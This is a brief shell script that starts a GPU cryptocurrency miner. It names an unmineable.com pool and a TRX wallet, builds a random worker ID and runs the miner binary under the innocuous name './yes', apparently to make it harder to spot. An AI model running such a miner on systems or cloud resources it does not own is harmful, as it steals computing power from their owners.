POOL=rx-us.unmineable.com:3333
WALLET=TRX:TXbYpaP8ifcocXH5LJa97djxL4aKd9Dabt
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo MK2u85UE-$(shuf -i 1911-698909 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
